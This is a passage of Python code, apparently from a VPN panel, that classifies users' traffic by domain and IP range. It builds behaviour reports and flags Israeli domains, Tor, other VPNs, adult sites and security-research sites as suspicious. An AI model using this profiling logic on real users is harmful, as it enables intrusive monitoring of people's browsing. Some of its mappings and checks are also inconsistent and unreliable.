    return users


# ── Traffic Classification ─────────────────────────────

_ACTIVITY_RULES = [
    # (keywords_in_host, category, service_name, risk_level)
    # Messaging / Chat
    (["telegram", "t.me", "tg.dev"], "Telegram", "msg", "safe"),
    (["whatsapp", "wa.me"], "WhatsApp", "msg", "safe"),
    (["signal.org", "signal.tube"], "Signal", "msg", "safe"),
    (["discord", "discordapp"], "Discord", "msg", "safe"),
    (["slack", "slack-edge"], "Slack", "msg", "safe"),
    (["viber"], "Viber", "msg", "safe"),
    (["skype"], "Skype", "msg", "safe"),
    (["messenger", "fbchat"], "Messenger", "msg", "safe"),
    (["imo.im"], "IMO", "msg", "safe"),
    # Social Media
    (["instagram", "cdninstagram"], "Instagram", "social", "safe"),
    (["facebook", "fbcdn", "fb.com", "fbsbx"], "Facebook", "social", "safe"),
    (["twitter", "x.com", "twimg"], "Twitter/X", "social", "safe"),
    (["tiktok", "musical.ly", "tiktokcdn"], "TikTok", "social", "safe"),
    (["snapchat", "snap.com", "sc-cdn"], "Snapchat", "social", "safe"),
    (["reddit"], "Reddit", "social", "safe"),
    (["linkedin"], "LinkedIn", "social", "safe"),
    (["pinterest", "pinimg"], "Pinterest", "social", "safe"),
    (["tumblr"], "Tumblr", "social", "safe"),
    (["threads.net"], "Threads", "social", "safe"),
    # Video / Streaming
    (["youtube", "googlevideo", "ytimg", "yt3.ggpht"], "YouTube", "video", "safe"),
    (["netflix", "nflxvideo", "nflximg"], "Netflix", "video", "safe"),
    (["spotify", "scdn.co"], "Spotify", "video", "safe"),
    (["twitch", "ttvnw"], "Twitch", "video", "safe"),
    (["vimeo"], "Vimeo", "video", "safe"),
    (["soundcloud", "sndcdn"], "SoundCloud", "video", "safe"),
    (["aparat.com"], "Aparat", "video", "safe"),
    (["filimo.com"], "Filimo", "video", "safe"),
    (["namava.ir"], "Namava", "video", "safe"),
    # Search / Browse
    (["google.com", "googleapis", "gstatic", "gvt1", "gvt2", "ggpht",
      "googleusercontent", "googlesyndication"], "Google", "search", "safe"),
    (["bing.com"], "Bing", "search", "safe"),
    (["yahoo.com"], "Yahoo", "search", "safe"),
    (["duckduckgo"], "DuckDuckGo", "search", "safe"),
    (["baidu.com"], "Baidu", "search", "safe"),
    # Shopping
    (["amazon.com", "amazon.co"], "Amazon", "shop", "safe"),
    (["ebay"], "eBay", "shop", "safe"),
    (["aliexpress", "alibaba", "alipay"], "AliExpress/Alibaba", "shop", "safe"),
    (["digikala"], "Digikala", "shop", "safe"),
    (["torob.com"], "Torob", "shop", "safe"),
    # Banking / Finance
    (["bank", ".bsi.ir", "shaparak", "saman", "mellat", "parsian", "pasargad",
      "saderat", "melli", "refah", "tejarat", "sep.ir", "bpm.ir"], "Banking", "bank", "watch"),
    (["paypal"], "PayPal", "bank", "safe"),
    (["crypto", "bitcoin", "binance", "coinbase", "bybit", "kucoin",
      "wallex", "nobitex", "ramzinex"], "Crypto/Exchange", "bank", "watch"),
    # Apple ecosystem
    (["icloud", ".apple.com", "mzstatic", "apple.com", "edge.apple",
      "push.apple.com", "iadsdk", "itunes"], "Apple/iCloud", "cloud", "safe"),
    # Microsoft / Cloud
    (["onedrive", "sharepoint", "live.com", "microsoft", "msftconnecttest",
      "office", "outlook"], "Microsoft", "cloud", "safe"),
    (["dropbox"], "Dropbox", "cloud", "safe"),
    (["drive.google", "docs.google"], "Google Drive", "cloud", "safe"),
    # Gaming
    (["steampowered", "steamcommunity", "valve"], "Steam", "game", "safe"),
    (["epicgames", "unrealengine"], "Epic Games", "game", "safe"),
    (["riotgames", "leagueoflegends"], "Riot Games", "game", "safe"),
    (["playstation", "psn"], "PlayStation", "game", "safe"),
    (["xbox", "xboxlive"], "Xbox", "game", "safe"),
    # News / Media
    (["bbc.com", "bbc.co.uk"], "BBC", "news", "safe"),
    (["cnn.com"], "CNN", "news", "safe"),
    (["aljazeera"], "Al Jazeera", "news", "safe"),
    (["reuters"], "Reuters", "news", "safe"),
    (["voanews", "voa"], "VOA", "news", "safe"),
    (["iranintl"], "International News", "news", "safe"),
    (["manoto", "manototv"], "Manoto", "news", "safe"),
    # Dev / Tech
    (["github", "githubassets", "githubusercontent"], "GitHub", "dev", "safe"),
    (["stackoverflow", "stackexchange"], "Stack Overflow", "dev", "safe"),
    (["gitlab"], "GitLab", "dev", "safe"),
    (["docker", "dockerhub"], "Docker", "dev", "safe"),
    (["npmjs", "npm"], "NPM", "dev", "safe"),
    (["pypi.org"], "PyPI", "dev", "safe"),
    # AI / Tools
    (["openai", "chatgpt"], "ChatGPT/OpenAI", "ai", "safe"),
    (["claude.ai", "anthropic"], "Claude/Anthropic", "ai", "safe"),
    (["gemini", "bard"], "Gemini/Google AI", "ai", "safe"),
    (["copilot"], "Copilot", "ai", "safe"),
    # CDN / Infra
    (["cloudflare", "cloudflare-dns"], "Cloudflare CDN", "infra", "safe"),
    (["akamai", "akamaized"], "Akamai CDN", "infra", "safe"),
    (["fastly"], "Fastly CDN", "infra", "safe"),
    (["cloudfront", "amazonaws"], "AWS", "infra", "safe"),
    (["doubleclick", "adservice", "googleadservices"], "Google Ads", "infra", "safe"),
    (["analytics", "googletagmanager", "google-analytics",
      "app-analytics", "bidease", "jampp"], "Ads/Analytics", "infra", "safe"),
    # VPN / Proxy
    (["vpngate", "vpnbook", "expressvpn", "nordvpn", "surfshark",
      "protonvpn", "windscribe"], "VPN/Proxy", "vpn", "watch"),
    (["torproject", ".onion"], "Tor Network", "vpn", "watch"),
    # Government / Military
    ([".gov.il", ".idf.il", ".mossad"], "Restricted Region A", "gov", "danger"),
    ([".il"], "Restricted Region Domain", "gov", "danger"),
    ([".gov", ".mil"], "Government/Military", "gov", "watch"),
    # Adult
    (["porn", "xxx", "xnxx", "xvideos", "xhamster", "pornhub", "brazzers",
      "redtube", "youporn", "onlyfans"], "Adult Content", "adult", "watch"),
    # Hacking / Exploit
    (["exploit-db", "kali", "metasploit", "hackthebox", "bugcrowd",
      "shodan.io", "censys.io", "zoomeye"], "Hacking/Security Tools", "hack", "danger"),
    (["pastebin", "paste.ee", "hastebin"], "Paste Sites", "hack", "watch"),
    (["darkweb", "dark.fail"], "Dark Web", "hack", "danger"),
]

# IP range -> (service, category, risk)
_IP_RANGES = []

def _init_ip_ranges():
    _ranges = [
        # Telegram
        ("149.154.160.0/20", "Telegram", "msg", "safe"),
        ("91.108.4.0/22",   "Telegram", "msg", "safe"),
        ("91.108.8.0/22",   "Telegram", "msg", "safe"),
        ("91.108.12.0/22",  "Telegram", "msg", "safe"),
        ("91.108.16.0/22",  "Telegram", "msg", "safe"),
        ("91.108.20.0/22",  "Telegram", "msg", "safe"),
        ("91.108.56.0/22",  "Telegram", "msg", "safe"),
        ("91.107.128.0/17", "Telegram", "msg", "safe"),
        # Google
        ("142.250.0.0/15",  "Google", "search", "safe"),
        ("172.217.0.0/16",  "Google", "search", "safe"),
        ("172.253.0.0/16",  "Google", "search", "safe"),
        ("74.125.0.0/16",   "Google", "search", "safe"),
        ("64.233.160.0/19", "Google", "search", "safe"),
        ("173.194.0.0/16",  "Google", "search", "safe"),
        ("216.239.32.0/19", "Google", "search", "safe"),
        ("216.58.192.0/19", "Google", "search", "safe"),
        ("108.177.0.0/17",  "Google", "search", "safe"),
        ("192.178.0.0/15",  "Google", "search", "safe"),
        # Apple
        ("17.0.0.0/8",      "Apple", "cloud", "safe"),
        ("57.144.0.0/16",   "Apple", "cloud", "safe"),
        # Facebook / Meta
        ("157.240.0.0/16",  "Facebook/Meta", "social", "safe"),
        ("185.60.216.0/22", "Facebook/Meta", "social", "safe"),
        ("31.13.24.0/21",   "Facebook/Meta", "social", "safe"),
        ("31.13.64.0/18",   "Facebook/Meta", "social", "safe"),
        ("129.134.0.0/16",  "Facebook/Meta", "social", "safe"),
        ("163.70.128.0/17", "Facebook/Meta", "social", "safe"),
        # Cloudflare
        ("104.16.0.0/13",   "Cloudflare", "infra", "safe"),
        ("104.24.0.0/14",   "Cloudflare", "infra", "safe"),
        ("172.64.0.0/13",   "Cloudflare", "infra", "safe"),
        ("162.158.0.0/15",  "Cloudflare", "infra", "safe"),
        ("162.159.0.0/16",  "Cloudflare", "infra", "safe"),
        ("1.1.1.0/24",      "Cloudflare DNS", "infra", "safe"),
        # Google DNS
        ("8.8.8.0/24",      "Google DNS", "infra", "safe"),
        ("8.8.4.0/24",      "Google DNS", "infra", "safe"),
        # Quad9 DNS
        ("9.9.9.0/24",      "Quad9 DNS", "infra", "safe"),
        # Microsoft / Azure
        ("20.33.0.0/16",    "Microsoft", "cloud", "safe"),
        ("20.40.0.0/13",    "Microsoft", "cloud", "safe"),
        ("20.128.0.0/16",   "Microsoft", "cloud", "safe"),
        ("20.157.0.0/16",   "Microsoft", "cloud", "safe"),
        ("20.189.0.0/16",   "Microsoft", "cloud", "safe"),
        ("20.190.0.0/16",   "Microsoft", "cloud", "safe"),
        ("13.107.0.0/16",   "Microsoft", "cloud", "safe"),
        ("40.126.0.0/16",   "Microsoft", "cloud", "safe"),
        ("52.96.0.0/14",    "Microsoft", "cloud", "safe"),
        ("52.112.0.0/14",   "Microsoft", "cloud", "safe"),
        # Akamai
        ("23.0.0.0/12",     "Akamai CDN", "infra", "safe"),
        ("23.32.0.0/11",    "Akamai CDN", "infra", "safe"),
        ("23.192.0.0/11",   "Akamai CDN", "infra", "safe"),
        ("184.24.0.0/13",   "Akamai CDN", "infra", "safe"),
        ("2.16.0.0/13",     "Akamai CDN", "infra", "safe"),
        # AWS
        ("3.0.0.0/8",       "AWS", "infra", "safe"),
        ("13.32.0.0/12",    "AWS CloudFront", "infra", "safe"),
        ("18.0.0.0/8",      "AWS", "infra", "safe"),
        ("34.0.0.0/8",      "AWS", "infra", "safe"),
        ("35.0.0.0/8",      "AWS", "infra", "safe"),
        ("44.192.0.0/10",   "AWS", "infra", "safe"),
        ("52.0.0.0/10",     "AWS", "infra", "safe"),
        ("54.0.0.0/8",      "AWS", "infra", "safe"),
        ("99.80.0.0/12",    "AWS", "infra", "safe"),
        # Fastly
        ("151.101.0.0/16",  "Fastly CDN", "infra", "safe"),
        ("146.75.0.0/16",   "Fastly CDN", "infra", "safe"),
        # Yandex
        ("213.180.192.0/19","Yandex", "search", "safe"),
        # Iran local ISPs (common domestic IPs)
        ("5.28.0.0/16",     "Iran ISP", "infra", "safe"),
        ("5.106.0.0/16",    "Iran ISP", "infra", "safe"),
        ("5.250.0.0/16",    "Iran ISP", "infra", "safe"),
        ("2.144.0.0/14",    "Iran ISP", "infra", "safe"),
        ("2.189.0.0/16",    "Iran ISP", "infra", "safe"),
        ("5.218.0.0/16",    "Iran ISP", "infra", "safe"),
        ("91.251.0.0/16",   "Iran ISP", "infra", "safe"),
        ("37.32.0.0/16",    "Iran ISP", "infra", "safe"),
        ("10.10.0.0/16",    "Local Network", "infra", "safe"),
        # Alibaba Cloud
        ("8.219.0.0/16",    "Alibaba Cloud", "infra", "safe"),
        ("8.222.0.0/16",    "Alibaba Cloud", "infra", "safe"),
        ("47.236.0.0/14",   "Alibaba Cloud", "infra", "safe"),
        ("47.240.0.0/14",   "Alibaba Cloud", "infra", "safe"),
        ("47.245.0.0/16",   "Alibaba Cloud", "infra", "safe"),
        ("47.252.0.0/16",   "Alibaba Cloud", "infra", "safe"),
        ("161.117.0.0/16",  "Alibaba Cloud", "infra", "safe"),
        # Hetzner
        ("65.109.0.0/16",   "Hetzner", "infra", "safe"),
        ("95.216.0.0/16",   "Hetzner", "infra", "safe"),
        ("148.251.0.0/16",  "Hetzner", "infra", "safe"),
        ("142.132.0.0/16",  "Hetzner", "infra", "safe"),
        # DigitalOcean
        ("164.90.0.0/16",   "DigitalOcean", "infra", "safe"),
        ("164.92.0.0/14",   "DigitalOcean", "infra", "safe"),
        # OVH
        ("51.222.0.0/16",   "OVH", "infra", "safe"),
        ("162.19.0.0/16",   "OVH", "infra", "safe"),
        ("141.95.0.0/16",   "OVH", "infra", "safe"),
        ("57.129.0.0/16",   "OVH", "infra", "safe"),
        # Tencent Cloud
        ("43.131.0.0/16",   "Tencent Cloud", "infra", "safe"),
        ("43.152.0.0/16",   "Tencent Cloud", "infra", "safe"),
        ("43.157.0.0/16",   "Tencent Cloud", "infra", "safe"),
        ("43.175.0.0/16",   "Tencent Cloud", "infra", "safe"),
        # More Iran ISPs
        ("185.208.172.0/22","Iran ISP", "infra", "safe"),
        ("185.147.176.0/22","Iran ISP", "infra", "safe"),
        ("185.166.104.0/22","Iran ISP", "infra", "safe"),
        ("185.239.0.0/22",  "Iran ISP", "infra", "safe"),
        ("185.240.148.0/22","Iran ISP", "infra", "safe"),
        ("87.247.184.0/21", "Iran ISP", "infra", "safe"),
        ("94.74.80.0/20",   "Iran ISP", "infra", "safe"),
        ("5.123.0.0/16",    "Iran ISP", "infra", "safe"),
        ("5.127.0.0/16",    "Iran ISP", "infra", "safe"),
        ("2.16.0.0/13",     "Iran ISP", "infra", "safe"),
        # WhatsApp
        ("185.60.216.0/22", "WhatsApp/Meta", "msg", "safe"),
    ]
    for cidr, svc, cat, risk in _ranges:
        try:
            _IP_RANGES.append((ipaddress.ip_network(cidr, strict=False), svc, cat, risk))
        except ValueError:
            pass

_init_ip_ranges()


def _classify_ip(ip_str):
    try:
        addr = ipaddress.ip_address(ip_str)
    except ValueError:
        return None
    for net, svc, cat, risk in _IP_RANGES:
        if addr in net:
            return {"service": svc, "category": cat, "risk": risk}
    return None


_CATEGORY_META = {
    "msg":    {"label": "Messaging",       "color": "#58a6ff", "icon_char": "\u2709"},
    "social": {"label": "Social Media",    "color": "#bc8cff", "icon_char": "\U0001f465"},
    "video":  {"label": "Video/Streaming", "color": "#f85149", "icon_char": "\u25b6"},
    "search": {"label": "Search/Browse",   "color": "#3fb950", "icon_char": "\U0001f50d"},
    "shop":   {"label": "Shopping",        "color": "#f0883e", "icon_char": "\U0001f6d2"},
    "bank":   {"label": "Banking/Finance", "color": "#d29922", "icon_char": "\U0001f3e6"},
    "cloud":  {"label": "Cloud/Storage",   "color": "#79c0ff", "icon_char": "\u2601"},
    "game":   {"label": "Gaming",          "color": "#d2a8ff", "icon_char": "\U0001f3ae"},
    "news":   {"label": "News/Media",      "color": "#7ee787", "icon_char": "\U0001f4f0"},
    "dev":    {"label": "Development",     "color": "#a5d6ff", "icon_char": "\U0001f4bb"},
    "ai":     {"label": "AI Tools",        "color": "#e3b341", "icon_char": "\U0001f916"},
    "infra":  {"label": "CDN/Infra",       "color": "#636c76", "icon_char": "\u2699"},
    "vpn":    {"label": "VPN/Proxy",       "color": "#f0883e", "icon_char": "\U0001f6e1"},
    "gov":    {"label": "Government",      "color": "#f85149", "icon_char": "\U0001f3db"},
    "adult":  {"label": "Adult",           "color": "#da3633", "icon_char": "\U0001f6ab"},
    "hack":   {"label": "Hacking Tools",   "color": "#f85149", "icon_char": "\u2620"},
    "other":  {"label": "Unclassified",    "color": "#8b949e", "icon_char": "\U0001f310"},
}

_classify_cache = {}

def classify_host(host):
    if host in _classify_cache:
        return _classify_cache[host]
    hl = host.lower()
    for keywords, name, cat, risk in _ACTIVITY_RULES:
        for kw in keywords:
            if kw in hl:
                r = {"service": name, "category": cat, "risk": risk}
                _classify_cache[host] = r
                return r
    if _IP_RE.match(host):
        ip_cls = _classify_ip(host)
        if ip_cls:
            _classify_cache[host] = ip_cls
            return ip_cls
        geo = _geo_cache.get(host)
        if geo and geo.get("org"):
            label = geo["org"][:30]
            r = {"service": label, "category": "infra", "risk": "safe"}
        else:
            r = {"service": f"IP ({host})", "category": "infra", "risk": "safe"}
        _classify_cache[host] = r
        return r
    parts = hl.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else hl
    r = {"service": domain, "category": "other", "risk": "safe"}
    _classify_cache[host] = r
    return r


def build_traffic_analysis(sites_data):
    categories = defaultdict(lambda: {"connections": 0, "services": defaultdict(int), "risk": "safe"})
    services = {}

    for s in sites_data:
        host = s["host"]
        count = s["count"]
        cls = classify_host(host)
        cat = cls["category"]
        svc = cls["service"]
        risk = cls["risk"]

        categories[cat]["connections"] += count
        categories[cat]["services"][svc] += count
        if risk == "danger" or (risk == "watch" and categories[cat]["risk"] != "danger"):
            categories[cat]["risk"] = risk

        if svc not in services or count > services[svc]["count"]:
            services[svc] = {"count": count, "category": cat, "risk": risk, "host": host}
        else:
            services[svc]["count"] += count

    total = sum(c["connections"] for c in categories.values()) or 1
    result_cats = []
    for cat, data in sorted(categories.items(), key=lambda x: x[1]["connections"], reverse=True):
        meta = _CATEGORY_META.get(cat, _CATEGORY_META["other"])
        top_svcs = sorted(data["services"].items(), key=lambda x: x[1], reverse=True)[:5]
        result_cats.append({
            "id": cat,
            "label": meta["label"],
            "color": meta["color"],
            "icon": meta["icon_char"],
            "connections": data["connections"],
            "percent": round(data["connections"] / total * 100, 1),
            "risk": data["risk"],
            "top_services": [{"name": n, "count": c} for n, c in top_svcs],
        })

    result_svcs = []
    for svc, data in sorted(services.items(), key=lambda x: x[1]["count"], reverse=True)[:30]:
        meta = _CATEGORY_META.get(data["category"], _CATEGORY_META["other"])
        result_svcs.append({
            "name": svc,
            "count": data["count"],
            "category": meta["label"],
            "category_id": data["category"],
            "color": meta["color"],
            "risk": data["risk"],
        })

    behavior_summary = []
    for c in result_cats[:5]:
        if c["percent"] >= 1:
            risk_tag = ""
            if c["risk"] == "danger":
                risk_tag = " [SUSPICIOUS]"
            elif c["risk"] == "watch":
                risk_tag = " [MONITOR]"
            top_svc_names = ", ".join(s["name"] for s in c["top_services"][:3])
            behavior_summary.append(f'{c["icon"]} {c["label"]}: {c["percent"]}% — {top_svc_names}{risk_tag}')

    return {
        "categories": result_cats,
        "services": result_svcs,
        "summary": behavior_summary,
        "category_meta": _CATEGORY_META,
    }


_PORT_ACTIVITY = {
    "443": "HTTPS (Browsing/Apps)",
    "80": "HTTP (Browsing)",
    "5222": "XMPP (Messaging — Telegram/WhatsApp/Jabber)",
    "5223": "Apple Push Notifications",
    "993": "IMAP (Reading Emails)",
    "995": "POP3 (Reading Emails)",
    "587": "SMTP (Sending Emails)",
    "465": "SMTP/TLS (Sending Emails)",
    "143": "IMAP (Email)",
    "25": "SMTP (Email - possibly spam)",
    "22": "SSH (Remote Server Access)",
    "3389": "RDP (Remote Desktop)",
    "5900": "VNC (Remote Desktop)",
    "1194": "OpenVPN",
    "51820": "WireGuard VPN",
    "8080": "HTTP Proxy/Alt Web",
    "8443": "HTTPS Alt",
    "53": "DNS Query",
    "853": "DNS-over-TLS",
    "5228": "Google Play Services / FCM Push",
    "5229": "Google Play Services",
    "5230": "Google Play Services",
    "9339": "Gaming",
    "27015": "Steam Gaming",
    "3478": "STUN (Voice/Video Call)",
    "3479": "STUN (Voice/Video Call)",
    "19302": "Google STUN (Voice/Video Call)",
    "443/udp": "QUIC (Fast Browsing)",
    "123": "NTP (Time Synchronization)",
    "5228": "Google Play / FCM Push Notifications",
}

_DOMAIN_ACTIVITY_HINTS = {
    "google.com": "Searching Google, using Google services (Gmail, Maps, Drive, YouTube)",
    "youtube": "Watching YouTube videos or listening to music",
    "instagram": "Browsing Instagram (photos, stories, reels)",
    "facebook": "Using Facebook (feed, messenger, groups)",
    "whatsapp": "WhatsApp messaging (text, voice, video calls)",
    "telegram": "Telegram messaging (chats, channels, groups, voice calls)",
    "twitter": "Browsing Twitter/X (tweets, spaces)",
    "tiktok": "Watching TikTok short videos",
    "netflix": "Watching Netflix movies/series",
    "spotify": "Listening to Spotify music/podcasts",
    "icloud": "Apple iCloud sync (photos, contacts, backup, Private Relay)",
    "apple.com": "Apple services (App Store, iCloud, updates, push notifications)",
    "push.apple.com": "Receiving iPhone/iPad push notifications",
    "microsoft": "Microsoft services (Office 365, OneDrive, Teams, Outlook)",
    "linkedin": "LinkedIn professional networking",
    "reddit": "Browsing Reddit forums",
    "github": "Using GitHub (code repos, development)",
    "stackoverflow": "Reading Stack Overflow (programming Q&A)",
    "openai": "Using ChatGPT / OpenAI",
    "claude": "Using Claude AI",
    "snapchat": "Using Snapchat (photos, stories)",
    "discord": "Using Discord (chat, voice, gaming communities)",
    "twitch": "Watching Twitch live streams",
    "pinterest": "Browsing Pinterest (images, ideas)",
    "amazon": "Shopping on Amazon",
    "ebay": "Shopping on eBay",
    "digikala": "Shopping on Digikala",
    "bank": "Online banking / financial transactions",
    "paypal": "PayPal payments",
    "binance": "Crypto trading on Binance",
    "coinbase": "Crypto trading on Coinbase",
    "signal": "Signal encrypted messaging",
    "viber": "Viber messaging / calls",
    "bbc": "Reading BBC News",
    "cnn": "Reading CNN News",
    "voanews": "Reading VOA News",
    "iranintl": "Watching international news",
    ".gov": "Accessing government websites",
    ".mil": "Accessing military websites",
    ".il": "Accessing restricted regional websites",
    "porn": "Viewing adult content",
    "xxx": "Viewing adult content",
    "vpngate": "Using another VPN service",
    "torproject": "Accessing Tor network",
    "shodan": "Using Shodan (security/hacking reconnaissance tool)",
    "exploit-db": "Browsing exploit database (hacking tool)",
    "pastebin": "Using Pastebin (data sharing - possibly sensitive data leak)",
    "aparat": "Watching video platform content",
    "digikala": "Shopping on Digikala",
    "snapp": "Using Snapp (ride-hailing / food delivery)",
    "tap30": "Using Tap30 (ride-hailing)",
    "divar": "Browsing Divar classifieds",
    "torob": "Searching Torob (price comparison)",
    "filimo": "Watching Filimo movies/series",
    "namava": "Watching Namava movies/series",
    "rubika": "Using Rubika messaging app",
    "eitaa": "Using Eitaa messaging app",
    "bale": "Using Bale messaging app",
    "gplay": "Downloading from Google Play Store",
    "play.google": "Downloading from Google Play Store",
    "pushwoosh": "Receiving app push notifications",
    "firebase": "Firebase (app analytics/push notifications)",
    "crashlytics": "App crash reporting",
    "adjust.com": "Ad tracking / analytics",
    "branch.io": "Deep link / ad tracking",
    "appsflyer": "Ad tracking / analytics",
    "sentry.io": "Error tracking service",
    "zoom.us": "Zoom video calls",
    "webex": "Webex video calls",
    "skype": "Skype calls/messaging",
    "meet.google": "Google Meet video calls",
    "teams.microsoft": "Microsoft Teams calls/meetings",
    "notion": "Using Notion (notes/docs)",
    "slack": "Using Slack (work messaging)",
    "trello": "Using Trello (task management)",
    "xbox": "Xbox Gaming services",
    "playstation": "PlayStation Gaming services",
    "epicgames": "Epic Games Store / Fortnite",
    "steampowered": "Steam Gaming platform",
    "twitch": "Watching Twitch live streams",
    "bing.com": "Searching Bing / Microsoft services",
    "duckduckgo": "Searching DuckDuckGo (private search)",
    "yahoo": "Using Yahoo services",
    "outlook": "Reading/sending Outlook email",
    "gmail": "Reading/sending Gmail email",
    "imap.google": "Fetching Gmail via IMAP",
    "smtp.google": "Sending email via Gmail SMTP",
    "dropbox": "Dropbox file storage/sharing",
    "drive.google": "Google Drive file storage",
    "onedrive": "Microsoft OneDrive file storage",
    "mega.nz": "MEGA file storage/sharing",
    "mediafire": "Mediafire file sharing",
    "cdn.discordapp": "Downloading Discord attachments/media",
    "graph.facebook": "Facebook API (app data sync)",
    "api.twitter": "Twitter/X API (app data sync)",
    "ip-api": "IP geolocation lookup",
    "ifconfig.me": "Checking own public IP address",
    "whatismyip": "Checking own public IP address",
    "speedtest": "Running internet speed test",
    "fast.com": "Running Netflix speed test",
}


def build_deep_analysis(sites_data, recent_data):
    """Build a detailed human-readable behavior report."""
    activities = []
    port_stats = defaultdict(int)
    hourly = defaultdict(int)
    unique_destinations = set()
    total_conns = 0

    _SERVICE_ACTIONS = {
        "Telegram": "Telegram messaging (chats, channels, groups, voice calls)",
        "Google DNS": "DNS resolution via Google (standard browsing)",
        "Google": "Using Google services (Search, Gmail, Maps, Drive, YouTube)",
        "Apple": "Apple services (iCloud, App Store, push notifications, Private Relay)",
        "Apple Push": "Receiving iPhone/iPad push notifications",
        "Instagram": "Browsing Instagram (photos, stories, reels)",
        "Facebook": "Using Facebook (feed, messenger, groups)",
        "WhatsApp": "WhatsApp messaging (text, voice, video calls)",
        "Twitter/X": "Browsing Twitter/X (tweets, spaces)",
        "TikTok": "Watching TikTok short videos",
        "YouTube": "Watching YouTube videos / listening to music",
        "Netflix": "Watching Netflix movies/series",
        "Spotify": "Listening to Spotify music/podcasts",
        "Discord": "Using Discord (chat, voice, gaming)",
        "Cloudflare": "Cloudflare CDN (website delivery / DNS)",
        "Cloudflare DNS": "DNS resolution via Cloudflare",
        "Fastly CDN": "Fastly CDN (content delivery for websites/apps)",
        "Akamai CDN": "Akamai CDN (content delivery for websites/apps)",
        "AWS": "Amazon Web Services (cloud infrastructure)",
        "Microsoft": "Microsoft services (Office 365, Azure, Teams)",
        "Hetzner": "Hetzner cloud server (hosting infrastructure)",
        "DigitalOcean": "DigitalOcean cloud server (hosting infrastructure)",
        "OVH": "OVH cloud server (hosting infrastructure)",
        "Alibaba Cloud": "Alibaba Cloud (hosting infrastructure)",
        "Tencent Cloud": "Tencent Cloud (hosting infrastructure)",
        "Regional ISP": "Connection to regional ISP infrastructure",
        "Signal": "Signal encrypted messaging",
        "Viber": "Viber messaging / calls",
    }

    for s in sites_data:
        host = s["host"]
        count = s["count"]
        port = s.get("port", "443")
        total_conns += count
        unique_destinations.add(host)
        port_stats[port] += count

        matched = False
        hl = host.lower()
        for pattern, hint in _DOMAIN_ACTIVITY_HINTS.items():
            if pattern in hl:
                activities.append({
                    "action": hint,
                    "host": host,
                    "count": count,
                    "port": port,
                })
                matched = True
                break

        if not matched:
            svc = s.get("service", "")
            if not svc:
                cls = classify_host(host)
                svc = cls.get("service", "")
            if svc in _SERVICE_ACTIONS:
                activities.append({
                    "action": _SERVICE_ACTIONS[svc],
                    "host": host,
                    "count": count,
                    "port": port,
                })
            elif svc and svc not in ("Unknown", "Unclassified") and "IP (" not in svc:
                activities.append({
                    "action": f"Using {svc}",
                    "host": host,
                    "count": count,
                    "port": port,
                })

    for r in recent_data:
        ts = r.get("time", "")
        if "/" in ts and " " in ts:
            try:
                hour = ts.split(" ")[1].split(":")[0]
                hourly[hour] += 1
            except (IndexError, ValueError):
                pass

    port_info = []
    for port, count in sorted(port_stats.items(), key=lambda x: x[1], reverse=True)[:10]:
        desc = _PORT_ACTIVITY.get(port, f"Port {port}")
        port_info.append({"port": port, "description": desc, "count": count})

    seen = set()
    unique_activities = []
    for a in sorted(activities, key=lambda x: x["count"], reverse=True):
        if a["action"] not in seen:
            seen.add(a["action"])
            unique_activities.append(a)

    peak_hours = sorted(hourly.items(), key=lambda x: x[1], reverse=True)[:3]
    peak_str = ", ".join(f"{h}:00 ({c}x)" for h, c in peak_hours) if peak_hours else "N/A"

    verdict = "Normal — No suspicious activity detected"
    verdict_level = "safe"
    for a in unique_activities:
        al = a["action"].lower()
        if any(w in al for w in ("hacking", "exploit", "military", "shodan", "reconnaissance")):
            verdict = "SUSPICIOUS — Possible security / hacking tools detected"
            verdict_level = "danger"
            break
        if any(w in al for w in ("israeli websites",)):
            verdict = "SUSPICIOUS — Connections to flagged destinations"
            verdict_level = "danger"
            break
        if any(w in al for w in ("adult content", "torproject", "tor network", "pastebin", "data leak")):
            if verdict_level != "danger":
                verdict = "Needs attention — Unusual activity detected"
                verdict_level = "watch"

    hourly_list = []
    for h in range(24):
        hk = f"{h:02d}"
        hourly_list.append({"hour": hk, "count": hourly.get(hk, 0)})

    return {
        "activities": unique_activities[:20],
        "ports": port_info,
        "peak_hours": peak_str,
        "unique_destinations": len(unique_destinations),
        "total_connections": total_conns,
        "verdict": verdict,
        "verdict_level": verdict_level,
        "hourly": hourly_list,
    }


# ── Activity / Geo ─────────────────────────────────────

_geo_cache = {}
_GEO_TTL = 86400
_IP_RE = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

# Group naming: prefix-<gbSlug>-<number>, e.g. 1gig-1g-001, vip-1p5g-012
_GROUP_RE = re.compile(r"^(?P<prefix>[A-Za-z0-9_-]+)-(?P<gb>[0-9]+(?:p[0-9]+)?g)-(?P<num>\d+)$")


def _parse_group_id(name: str):
    m = _GROUP_RE.match(name or "")
    if not m:
        return None
    return f"{m.group('prefix')}-{m.group('gb')}"

WARN_DOMAINS = [".gov", ".mil", ".gov.il", ".idf.il"]

_DOMAIN_CC = {
    "google": ("US", "Google"), "youtube": ("US", "Google/YouTube"),
    "facebook": ("US", "Meta/Facebook"), "instagram": ("US", "Meta/Instagram"),
    "whatsapp": ("US", "Meta/WhatsApp"), "apple": ("US", "Apple"),
    "icloud": ("US", "Apple/iCloud"), "microsoft": ("US", "Microsoft"),
    "bing": ("US", "Microsoft/Bing"), "amazon": ("US", "Amazon"),
    "cloudflare": ("US", "Cloudflare"), "telegram": ("GB", "Telegram"),
    "twitter": ("US", "X/Twitter"), "tiktok": ("SG", "TikTok"),
    "netflix": ("US", "Netflix"), "spotify": ("SE", "Spotify"),
    "doubleclick": ("US", "Google Ads"), "googleapis": ("US", "Google APIs"),
    "gstatic": ("US", "Google Static"), "fbcdn": ("US", "Meta CDN"),
    "akamai": ("US", "Akamai CDN"), "cloudfront": ("US", "AWS CloudFront"),
    ".il": ("IL", "Restricted Region"), ".gov.il": ("IL", "Restricted Region Gov"),
    ".gov": ("US", "US Government"), ".mil": ("US", "US Military"),
}


def resolve_geo_batch(hosts):
    now = time.time()
    to_resolve = []
    for h in set(hosts):
        cached = _geo_cache.get(h)
        if cached and now - cached.get("_t", 0) < _GEO_TTL:
            continue
        if _IP_RE.match(h):
            to_resolve.append(h)
    if not to_resolve:
        return
    for i in range(0, len(to_resolve), 80):
        batch = to_resolve[i : i + 80]
        try:
            payload = json.dumps(
                [{"query": h, "fields": "status,country,countryCode,city,org,isp,query"}
                 for h in batch]
            )
            result = subprocess.run(
                ["curl", "-s", "-x", "socks5h://127.0.0.1:10080",
                 "--connect-timeout", "5", "-m", "10",
                 "-X", "POST", "http://ip-api.com/batch",
